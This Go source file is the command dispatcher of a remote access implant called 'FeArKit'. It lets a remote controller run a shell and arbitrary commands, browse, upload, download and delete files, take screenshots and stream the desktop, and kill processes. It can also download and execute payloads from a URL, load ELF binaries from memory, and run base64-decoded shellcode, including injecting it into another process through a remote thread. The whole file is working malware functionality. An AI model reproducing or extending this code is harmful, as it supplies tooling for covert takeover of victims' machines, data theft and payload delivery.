package core

import (
	"FeArKit/client/common"
	"FeArKit/client/service/basic"
	"FeArKit/client/service/desktop"
	"FeArKit/client/service/file"
	"FeArKit/client/service/process"
	"FeArKit/client/service/shellcode"
	"FeArKit/client/service/executable"
	Screenshot "FeArKit/client/service/screenshot"
	"FeArKit/client/service/terminal"
	"FeArKit/modules"
	"github.com/kataras/golog"
	"os"
	"os/exec"
	"reflect"
	"strings"
	"encoding/base64"
	"regexp"
)

var handlers = map[string]func(pack modules.Packet, wsConn *common.Conn){
	`PING`:             ping,
	`KILL`:          	kill,
	`RESTART`:          restart,
	`SHUTDOWN`:         shutdown,
	`SCREENSHOT`:       screenshot,
	`TERMINAL_INIT`:    initTerminal,
	`TERMINAL_INPUT`:   inputTerminal,
	`TERMINAL_RESIZE`:  resizeTerminal,
	`TERMINAL_PING`:    pingTerminal,
	`TERMINAL_KILL`:    killTerminal,
	`FILES_LIST`:       listFiles,
	`FILES_FETCH`:      fetchFile,
	`FILES_REMOVE`:     removeFiles,
	`FILES_UPLOAD`:     uploadFiles,
	`FILE_UPLOAD_TEXT`: uploadTextFile,
	`PROCESSES_LIST`:   listProcesses,
	`PROCESS_KILL`:     killProcess,
	`DESKTOP_INIT`:     initDesktop,
	`DESKTOP_PING`:     pingDesktop,
	`DESKTOP_KILL`:     killDesktop,
	`DESKTOP_SHOT`:     getDesktop,
	`COMMAND_EXEC`:     execCommand,
	`SHELLCODE_EXEC`:   execShellcode,
	`LOAD_ELF`:  		loadElf,
	`DOWNLOAD_EXEC`:  	DownloadAndExecute,
}

func ping(pack modules.Packet, wsConn *common.Conn) {
	wsConn.SendCallback(modules.Packet{Code: 0}, pack)
	device, err := GetPartialInfo()
	if err != nil {
		golog.Error(err)
		return
	}
	wsConn.SendPack(modules.CommonPack{Act: `DEVICE_UPDATE`, Data: *device})
}

func kill(pack modules.Packet, wsConn *common.Conn) {
	wsConn.SendCallback(modules.Packet{Code: 0}, pack)
	stop = true
	wsConn.Close()
	os.Exit(0)
}

func restart(pack modules.Packet, wsConn *common.Conn) {
	err := basic.Restart()
	if err != nil {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
	} else {
		wsConn.SendCallback(modules.Packet{Code: 0}, pack)
	}
}

func shutdown(pack modules.Packet, wsConn *common.Conn) {
	err := basic.Shutdown()
	if err != nil {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
	} else {
		wsConn.SendCallback(modules.Packet{Code: 0}, pack)
	}
}

func screenshot(pack modules.Packet, wsConn *common.Conn) {
	var bridge string
	if val, ok := pack.GetData(`bridge`, reflect.String); !ok {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
		return
	} else {
		bridge = val.(string)
	}
	err := Screenshot.GetScreenshot(bridge)
	if err != nil {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
	}
}

func initTerminal(pack modules.Packet, wsConn *common.Conn) {
	err := terminal.InitTerminal(pack)
	if err != nil {
		wsConn.SendCallback(modules.Packet{Act: `TERMINAL_INIT`, Code: 1, Msg: err.Error()}, pack)
	} else {
		wsConn.SendCallback(modules.Packet{Act: `TERMINAL_INIT`, Code: 0}, pack)
	}
}

func inputTerminal(pack modules.Packet, wsConn *common.Conn) {
	terminal.InputTerminal(pack)
}

func resizeTerminal(pack modules.Packet, wsConn *common.Conn) {
	terminal.ResizeTerminal(pack)
}

func pingTerminal(pack modules.Packet, wsConn *common.Conn) {
	terminal.PingTerminal(pack)
}

func killTerminal(pack modules.Packet, wsConn *common.Conn) {
	terminal.KillTerminal(pack)
}

func listFiles(pack modules.Packet, wsConn *common.Conn) {
	path := `/`
	if val, ok := pack.GetData(`path`, reflect.String); ok {
		path = val.(string)
	}
	files, err := file.ListFiles(path)
	if err != nil {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
	} else {
		wsConn.SendCallback(modules.Packet{Code: 0, Data: smap{`files`: files}}, pack)
	}
}

func fetchFile(pack modules.Packet, wsConn *common.Conn) {
	var path, filename, bridge string
	if val, ok := pack.GetData(`path`, reflect.String); !ok {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|EXPLORER.FILE_OR_DIR_NOT_EXIST}`}, pack)
		return
	} else {
		path = val.(string)
	}
	if val, ok := pack.GetData(`file`, reflect.String); !ok {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
		return
	} else {
		filename = val.(string)
	}
	if val, ok := pack.GetData(`bridge`, reflect.String); !ok {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
		return
	} else {
		bridge = val.(string)
	}
	err := file.FetchFile(path, filename, bridge)
	if err != nil {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
	}
}

func removeFiles(pack modules.Packet, wsConn *common.Conn) {
	var files []string
	if val, ok := pack.Data[`files`]; !ok {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|EXPLORER.FILE_OR_DIR_NOT_EXIST}`}, pack)
		return
	} else {
		slice := val.([]any)
		for i := 0; i < len(slice); i++ {
			file, ok := slice[i].(string)
			if ok {
				files = append(files, file)
			}
		}
		if len(files) == 0 {
			wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|EXPLORER.FILE_OR_DIR_NOT_EXIST}`}, pack)
			return
		}
	}
	err := file.RemoveFiles(files)
	if err != nil {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
	} else {
		wsConn.SendCallback(modules.Packet{Code: 0}, pack)
	}
}

func uploadFiles(pack modules.Packet, wsConn *common.Conn) {
	var (
		start, end int64
		files      []string
		bridge     string
	)
	if val, ok := pack.Data[`files`]; !ok {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|EXPLORER.FILE_OR_DIR_NOT_EXIST}`}, pack)
		return
	} else {
		slice := val.([]any)
		for i := 0; i < len(slice); i++ {
			file, ok := slice[i].(string)
			if ok {
				files = append(files, file)
			}
		}
		if len(files) == 0 {
			wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|EXPLORER.FILE_OR_DIR_NOT_EXIST}`}, pack)
			return
		}
	}
	if val, ok := pack.GetData(`bridge`, reflect.String); !ok {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
		return
	} else {
		bridge = val.(string)
	}
	{
		if val, ok := pack.GetData(`start`, reflect.Float64); ok {
			start = int64(val.(float64))
		}
		if val, ok := pack.GetData(`end`, reflect.Float64); ok {
			end = int64(val.(float64))
			if end > 0 {
				end++
			}
		}
		if end > 0 && end < start {
			wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
			return
		}
	}
	err := file.UploadFiles(files, bridge, start, end)
	if err != nil {
		golog.Error(err)
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
	}
}

func uploadTextFile(pack modules.Packet, wsConn *common.Conn) {
	var path, bridge string
	if val, ok := pack.GetData(`file`, reflect.String); !ok {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|EXPLORER.FILE_OR_DIR_NOT_EXIST}`}, pack)
		return
	} else {
		path = val.(string)
	}
	if val, ok := pack.GetData(`bridge`, reflect.String); !ok {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
		return
	} else {
		bridge = val.(string)
	}
	err := file.UploadTextFile(path, bridge)
	if err != nil {
		golog.Error(err)
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
	}
}

func listProcesses(pack modules.Packet, wsConn *common.Conn) {
	processes, err := process.ListProcesses()
	if err != nil {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
	} else {
		wsConn.SendCallback(modules.Packet{Code: 0, Data: map[string]any{`processes`: processes}}, pack)
	}
}

func killProcess(pack modules.Packet, wsConn *common.Conn) {
	var (
		pid int32
		err error
	)
	if val, ok := pack.GetData(`pid`, reflect.Float64); !ok {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
		return
	} else {
		pid = int32(val.(float64))
	}
	err = process.KillProcess(int32(pid))
	if err != nil {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
	} else {
		wsConn.SendCallback(modules.Packet{Code: 0}, pack)
	}
}

func initDesktop(pack modules.Packet, wsConn *common.Conn) {
	err := desktop.InitDesktop(pack)
	if err != nil {
		wsConn.SendCallback(modules.Packet{Act: `DESKTOP_INIT`, Code: 1, Msg: err.Error()}, pack)
	} else {
		wsConn.SendCallback(modules.Packet{Act: `DESKTOP_INIT`, Code: 0}, pack)
	}
}

func pingDesktop(pack modules.Packet, wsConn *common.Conn) {
	desktop.PingDesktop(pack)
}

func killDesktop(pack modules.Packet, wsConn *common.Conn) {
	desktop.KillDesktop(pack)
}

func getDesktop(pack modules.Packet, wsConn *common.Conn) {
	desktop.GetDesktop(pack)
}

func execCommand(pack modules.Packet, wsConn *common.Conn) {
	var proc *exec.Cmd
	var cmd, args string
	if val, ok := pack.Data[`cmd`]; !ok {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
		return
	} else {
		cmd = val.(string)
	}
	if len(cmd) > 0 {
		var execCmd, execArgs string
		// If cmd starts with a quote (double or single)
		if cmd[0] == '"' || cmd[0] == '\'' {
			quote := cmd[0]
			// Find the closing matching quote.
			endQuote := strings.IndexRune(cmd[1:], rune(quote))
			if endQuote >= 0 {
				endQuote += 1 // adjust since we started at index 1
				// The command is the substring inside the quotes.
				execCmd = cmd[1:endQuote]
				// Everything after the closing quote (if any) is treated as arguments.
				if len(cmd) > endQuote+1 {
					execArgs = strings.TrimSpace(cmd[endQuote+1:])
				}
			} else {
				// No matching quote found, use the full string.
				execCmd = cmd
			}
		} else {
			// Split at the first space.
			parts := strings.SplitN(cmd, " ", 2)
			execCmd = parts[0]
			if len(parts) == 2 {
				execArgs = parts[1]
			}
		}
		cmd = execCmd
		// Set the args variable for later use.
		args = execArgs
	}
	if len(args) == 0 {
		proc = exec.Command(cmd)
	} else {
		re := regexp.MustCompile(`("[^"]+"|'[^']+'|\S+)`)
		matches := re.FindAllString(args, -1)
		var argSlice []string
		for _, arg := range matches {
			if (arg[0] == '"' && arg[len(arg)-1] == '"') || (arg[0] == '\'' && arg[len(arg)-1] == '\'') {
				arg = arg[1 : len(arg)-1]
			}
			argSlice = append(argSlice, arg)
		}
		proc = exec.Command(cmd, argSlice...)
	}
	err := proc.Start()
	if err != nil {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
	} else {
		wsConn.SendCallback(modules.Packet{Code: 0, Data: map[string]any{
			`pid`: proc.Process.Pid,
		}}, pack)
		proc.Process.Release()
	}
}

func loadElf(pack modules.Packet, wsConn *common.Conn) {
	var path string
	var elf string
	if val, ok := pack.Data[`elf`]; !ok {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
		return
	} else {
		elf = val.(string)
	}
	elfBytes, err := base64.StdEncoding.DecodeString(elf)
	if err != nil {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
		return
	}
	if val, ok := pack.Data[`path`]; !ok {
		path = ""
	} else {
		path = val.(string)
	}
	err = executable.LoadElf(elfBytes,  path)

	if err != nil {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
	}else {
		wsConn.SendCallback(modules.Packet{Code: 0}, pack)
	}
}

func DownloadAndExecute(pack modules.Packet, wsConn *common.Conn) {
	var url string
	var path string
	if val, ok := pack.Data[`url`]; !ok {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
		return
	} else {
		url = val.(string)
	}
	if val, ok := pack.Data[`path`]; !ok {
		path = ""
	} else {
		path = val.(string)
	}
	err := executable.DownloadAndExecute(url, path)
	if err != nil {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
	}else {
		wsConn.SendCallback(modules.Packet{Code: 0}, pack)
	}
}

func execShellcode(pack modules.Packet, wsConn *common.Conn) {
	var scode string
	if val, ok := pack.Data[`shellcode`]; !ok {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
		return
	} else {
		scode = val.(string)
	}
	scodeBytes, err := base64.StdEncoding.DecodeString(scode)
	if err != nil {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
		return
	}
	if val, ok := pack.Data[`targetimage`]; ok && val != "" {
		if targetImageStr, isStr := val.(string); isStr {
			err = shellcode.StartRemoteThread(scodeBytes, targetImageStr)
		} else {
			wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
			return
		}
	} else {
		err = shellcode.ExecShellcode(scodeBytes)
	}
	if err != nil {
		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
	}else {
		wsConn.SendCallback(modules.Packet{Code: 0}, pack)
	}
}


func inputRawTerminal(pack []byte, event string) {
	terminal.InputRawTerminal(pack, event)
}
